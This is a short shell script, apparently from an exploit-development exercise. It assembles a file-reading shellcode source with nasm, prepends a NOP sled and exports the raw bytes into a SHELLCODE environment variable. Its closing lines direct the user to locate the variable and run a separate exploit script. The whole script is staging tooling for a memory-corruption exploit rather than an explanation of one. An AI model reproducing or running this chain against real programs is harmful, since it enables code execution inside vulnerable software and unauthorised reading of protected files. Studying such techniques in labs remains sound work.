#!/bin/sh
# gen_shellcode.sh -- assemble sc.asm and export it as $SHELLCODE with a NOP sled.
#
# Pipeline:
#   1. nasm assembles sc.asm (the open/read/write code + file path) to raw bytes.
#   2. we prepend a NOP sled so the jump target doesn't have to be exact.
#   3. the whole thing is exported into $SHELLCODE for the current shell.
#
# Source it so the variable survives in your interactive shell:
#   . ./gen_shellcode.sh
#
# Adjust SLED if you want a bigger/smaller landing zone, or ASM to point at a
# different source file.

ASM=${ASM:-sc.asm}          # assembly source (defaults to ./sc.asm)
BIN=${BIN:-/tmp/sc.bin}     # where the assembled raw bytes go
SLED=${SLED:-200}           # number of NOP (0x90) bytes to prepend

# 1. assemble sc.asm -> raw opcodes
nasm -f bin "$ASM" -o "$BIN" || {
    echo "[!] nasm failed on $ASM" >&2
    return 1 2>/dev/null || exit 1
}

# 2. + 3. build "<SLED NOPs><assembled bytes>" and export it.
#    We read the assembled file in python, prepend the sled, and emit the raw
#    bytes so bash captures them verbatim into the environment variable.
export SHELLCODE=$(python -c "
import sys
data = open('$BIN','rb').read()
sys.stdout.write('\x90'*$SLED + data)
")

echo "[*] assembled $ASM -> $BIN ($(wc -c < "$BIN") bytes)"
echo "[*] SHELLCODE exported: ${SLED}-byte NOP sled + shellcode"
echo "[*] now locate it (e.g. /tmp/loce) and run exploit05.py"
